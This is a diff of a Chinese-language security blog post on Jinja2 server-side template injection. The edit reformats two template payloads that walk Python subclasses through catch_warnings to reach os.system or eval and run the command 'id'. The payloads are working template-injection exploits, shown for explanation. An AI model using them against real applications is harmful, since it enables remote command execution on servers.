@@ -105,17 +105,21 @@ while 1:
 
 回到如何在 Jinja2 模板中直接执行代码的问题上，因为模板中能够访问 Python 内置的变量和变量方法，并且还能通过 Jinja2 的模板语法去遍历变量，因此可以构造出如下模板 Payload 来达到和上面 PoC 一样的效果：
 
-	{% for c in [].__class__.__base__.__subclasses__() %}
-	{% if c.__name__ == 'catch_warnings' %}
-	{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
-	{% endif %}
-	{% endfor %}
+```
+{% raw %}
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
+{% endif %}
+{% endfor %}
+{% endraw %}
+```
 
 使用该 Payload 作为示例代码二的执行参数，最终会执行系统命令 `id`：
 
 ![]({{ site.url }}/public/img/article/2016-02-24-use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/6.png)
 
-当然除了遍历找到 `os` 模块外，还能直接找回 `eval` 函数并进行调用，这样就能够调用复杂的 Python 代码：
+当然除了遍历找到 `os` 模块外，还能直接找回 `eval` 函数并进行调用，这样就能够调用复杂的 Python 代码。
 
 原始的 Python PoC 代码如下：
 
@@ -125,17 +129,21 @@ while 1:
 
 在 Jinja2 中模板 Payload 如下：
 
-	{% for c in [].__class__.__base__.__subclasses__() %}
-	{% if c.__name__ == 'catch_warnings' %}
-	  {% for b in c.__init__.func_globals.values() %}
-	  {% if b.__class__ == {}.__class__ %}
-	    {% if 'eval' in b.keys() %}
-	      {{ b['eval']('__import__("os").popen("id").read()') }}
-	    {% endif %}
-	  {% endif %}
-	  {% endfor %}
-	{% endif %}
-	{% endfor %}
+```
+{% raw %}
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.func_globals.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+{% endraw %}
+```
 
 使用该 Payload 作为示例代码二的执行参数（注意引号转义），成功执行会使用 `eval()` 函数动态载入 `os` 模块并执行命令：
 
